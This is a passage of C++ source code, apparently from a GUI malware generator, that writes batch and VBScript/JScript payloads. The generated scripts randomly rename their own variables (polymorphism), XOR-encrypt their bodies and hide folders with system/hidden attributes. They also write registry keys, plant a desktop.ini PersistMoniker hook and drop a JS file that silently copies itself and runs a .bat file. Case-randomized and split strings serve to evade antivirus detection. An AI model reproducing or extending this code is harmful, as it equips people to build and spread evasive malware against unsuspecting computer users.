        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+actw+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rg1w+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rg2w+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sfr1+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sfr2+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+tmps+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+htmv+"\","+mutr+"(int(rnd*5)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+beh1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+beh2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+beh3+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+flss+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fvai+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+sfls+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+bfp5+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pyrn+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+bfp1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+bfp2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+bfp3+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+bfp4+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+faf1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+faf2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+faf3+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fafB+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fafX+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+fafY+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+avd1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mskn+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+aur1+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+aur2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+aur3+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+cib1+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msha+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mshg+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msrk+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mskr+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mssr+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mssl+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msbr+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msbl+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+safa+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+safb+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+saff+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+saf2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+saft+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+saf1+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+safc+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+safv+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+safx+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+safk+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+msfa+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mssa+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+adsd+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+muta+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+mutr+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        if (Form15->CheckBox90->Checked)
        {
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polar+"\","+mutr+"(int(rnd*9)+2,3))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polt+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polk+"\","+mutr+"(int(rnd*9)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pol1+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pol2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pol3+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pol4+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pol5+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polr+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polv+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polp+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pols+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pola+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+poll+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polb+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polf+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+polu+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+pold+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        }
        if (Form15->RadioButton4->Checked)
        {                           
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rryf+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rryc+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rryo+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rry1+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rry2+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+rry3+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        }
        if (Form15->CheckBox96->Checked)
        {
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmtm+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmv1+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmcv+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmtc+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmmf+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmvc+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmbf+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmwa+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmnt+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+wmid+"\","+mutr+"(int(rnd*8)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        }
        if (Form15->CheckBox96->Checked)
        {
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emv1+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emcv+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emtc+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emtm+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emea+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+muta+"=replace("+muta+",\""+emes+"\","+mutr+"(int(rnd*7)+2,2))>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        }
        wstf(CaseRand("echo")+" function "+mutr+"("+mutl+","+mutb+")>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for "+mutc+"=1 to "+mutl+">>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if "+mutb+"=3 then>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+mutt+"=int(rnd*130)+125>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if (rnd*2000/1000)=1 then>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+mutt+"=int(rnd*26)+97>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+mutt+"=int(rnd*26)+65>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+mutr+"="+mutr+"&chr("+mutt+")>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end function>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + mutf + "=" + muts + ".opentextfile(\""+istd+"\\" + tmpn + ".bat\",2)>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + mutf + ".write " + muta + ">>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + mutf + ".close>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + mutH + ".regwrite \"HKCU\\Software\\" + plrn + "\\" + mutX + "\",\""+mutY+"\">>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf("cscript %"+CaseRand("tmp")+"%\\" + tmut + ".vbs>nul" + ffos);
    }
    if (Form15->CheckBox49->Checked)
    {
        wstf("echo."+CaseRand("on error resume next")+">%tmp%\\"+ eeyy +".vbs");
        wstf("echo dim "+eeth+","+eepw+">>%tmp%\\"+ eeyy +".vbs");;
        wstf("echo set "+eefs+"="+CaseRand("createobject(\"scripting.filesystemobject")+"\")>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo set "+eevf+"="+eefs+".opentextfile(\"%tmp%\\"+eexx+"."+tfre+"\")>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eeeu+"="+eevf+".readall>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eevf+".close>>%tmp%\\"+ eeyy +".vbs");
        if (Form15->CheckBox95->Checked == false)
            wstf("echo "+eepw+"=\""+epwd+"\">>%tmp%\\"+ eeyy +".vbs");
        else                          
        {                                     
            wstf(CaseRand("echo")+" randomize>>%tmp%\\"+ eeyy +".vbs");
            wstf(CaseRand("echo")+" "+eepw+"="+fakr+"(int(rnd*22))>>%tmp%\\"+ eeyy +".vbs");
            wstf(CaseRand("echo")+" "+eeeu+"=replace("+eeeu+",\""+epwd+"\","+eepw+")>>%tmp%\\"+ eeyy +".vbs");
            wstf(CaseRand("echo")+" function "+fakr+"("+fakl+")>>%tmp%\\"+ eeyy +".vbs");
            wstf(CaseRand("echo")+" for "+fakc+"=1 to "+fakl+">>%tmp%\\"+ eeyy +".vbs");
            wstf(CaseRand("echo")+" randomize>>%tmp%\\"+ eeyy +".vbs");
            wstf(CaseRand("echo")+" "+fakr+"="+fakr+"&chr(int(rnd*130)+125)>>%tmp%\\"+ eeyy +".vbs");
            wstf(CaseRand("echo")+" next>>%tmp%\\"+ eeyy +".vbs");
            wstf(CaseRand("echo")+" end function>>%tmp%\\"+ eeyy +".vbs");
        }
        wstf("echo set "+eevf+"="+eefs+".opentextfile(\""+istd+"\\" + tmpn + ".bat\")>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eedd+"="+eevf+".readall>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eevf+".close>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eedd+"="+eedf+"("+eedd+")>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo set "+eevf+"="+eefs+".opentextfile(\""+istd+"\\" + tmpn + ".bat\",2)>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eevf+".write "+eeeu+">>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eevf+".write "+eedd+">>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eevf+".close>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo function "+eedf+"("+eeft+")>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo."+CaseRand("on error resume next")+">>%tmp%\\"+ eeyy +".vbs");
        wstf("echo dim "+eed2+","+eect+">>%tmp%\\"+ eeyy +".vbs");
        if (Form15->CheckBox60->Checked)
            wstf("echo "+eeft+"=strreverse("+eeft+")>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eed2+"=1>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo for "+eect+"=1 to len("+eeft+")>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eecc+"=asc(mid("+eeft+","+eect+",1))>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eepc+"=asc(mid("+eepw+","+eed2+",1))>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eedf+"="+eedf+"&chr("+eecc+" Xor("+eepc+"))>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo if not("+eed2+"=len("+eepw+")) then>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eed2+"="+eed2+"+1>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo else>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo "+eed2+"=1>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo end if>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo next>>%tmp%\\"+ eeyy +".vbs");
        wstf("echo end function>>%tmp%\\"+ eeyy +".vbs");
        wstf("cscript %tmp%\\"+ eeyy +".vbs>nul");
    }
    if (Form15->CheckBox59->Checked)
    {
        wstf("if not "+behk+"=="+behk+"%1 goto " + behl);
        wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">%"+CaseRand("tmp")+"%\\" + behv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + tmps + ".run \""+istd+"\\" + tmpn + ".bat "+behr+"\", 0>>%"+CaseRand("tmp")+"%\\" + behv + ".vbs" + ffos);
        wstf("cscript %"+CaseRand("tmp")+"%\\" + behv + ".vbs>nul" + ffos);
        wstf("goto "+labf);
        wstf(":" + behl);
    }
    wstf("md "+istd+"\\" + dosd + ffos);
    wstf("attrib +s +h "+istd+"\\" + dosd + ffos);
    wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">"+istd+"\\" + istv + ".vbs" + ffos);
    wstf(CaseRand("echo")+" "+CaseRand("set")+" " + vbif + "="+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>"+istd+"\\" + istv + ".vbs" + ffos);
    wstf(CaseRand("echo")+" if not(err.number=0) then>>"+istd+"\\" + istv + ".vbs" + ffos);
    wstf(CaseRand("rem ") + srstfk + CaseRand("|echo")+" javascript:location.reload()>>"+istd+"\\" + istv + ".vbs" + ffos);
    wstf(CaseRand("echo")+" else>>"+istd+"\\" + istv + ".vbs" + ffos);
    wstf(CaseRand("echo")+" "+CaseRand("set")+" " + vbik + "=" + vbif + ".createtextfile(\"%"+CaseRand("tmp")+"%\\" + vbib + ".bat\",1)>>"+istd+"\\" + istv + ".vbs" + ffos);
    if (Form15->CheckBox57->Checked)
    { // desktop.ini creation
        wstf(ffos + rvtfk + CaseRand("set")+" "+favc+"=FE0-28D4-11CF-AE66-08002B2E1");
        wstf(CaseRand("echo")+" [ExtShellFolderViews]>%"+CaseRand("tmp")+"%\\" + itmp + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" {5984F%"+favc+"%262}={5984F%"+favc+"%262}>>%"+CaseRand("tmp")+"%\\" + itmp + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" [{5984F%"+favc+"%262}]>>%"+CaseRand("tmp")+"%\\" + itmp + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" PersistMoniker=file://"+dihn+".htt>>%"+CaseRand("tmp")+"%\\" + itmp + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" [.ShellClassInfo]>>%"+CaseRand("tmp")+"%\\" + itmp + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" ConfirmFileOp=0>>%"+CaseRand("tmp")+"%\\" + itmp + "."+tfre+"" + ffos);
    }
    wstf(ffos + rvtfk + "set "+kkns+"=/");
    wstf(CaseRand("echo")+" %"+kkns+"%*>"+istd+"\\" + istj + ".js" + ffos);
    wstf("type "+istd+"\\" + tmpn + ".bat>>"+istd+"\\" + istj + ".js" + ffos);
    wstf(CaseRand("echo")+" *%"+kkns+"%>>"+istd+"\\" + istj + ".js" + ffos);
    wstf(CaseRand("echo")+" var " + jsfs + "=W%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\");>>"+istd+"\\" + istj + ".js" + ffos);
    wstf(CaseRand("echo")+" var " + jsws + "=W%" + vbih + "%."+CaseRand("createobject")+"(\"w%" + vbih + "%.shell\");>>"+istd+"\\" + istj + ".js" + ffos);
    wstf(CaseRand("echo")+" " + jsfs + ".copyfile(W%" + vbih + "%.%" + vbih + "%name,\"%"+CaseRand("tmp")+"%\\\\" + vbib + ".bat\",1);>>"+istd+"\\" + istj + ".js" + ffos);
    wstf(CaseRand("echo")+" " + jsws + ".run(\"%"+CaseRand("tmp")+"%\\\\" + vbib + ".bat\",0);>>"+istd+"\\" + istj + ".js" + ffos);
    if (Form15->CheckBox3->Checked == true)
    {
        wstf("if exist "+istd+"\\" + dosd + "\\" + autn + ".bat goto " + autl);
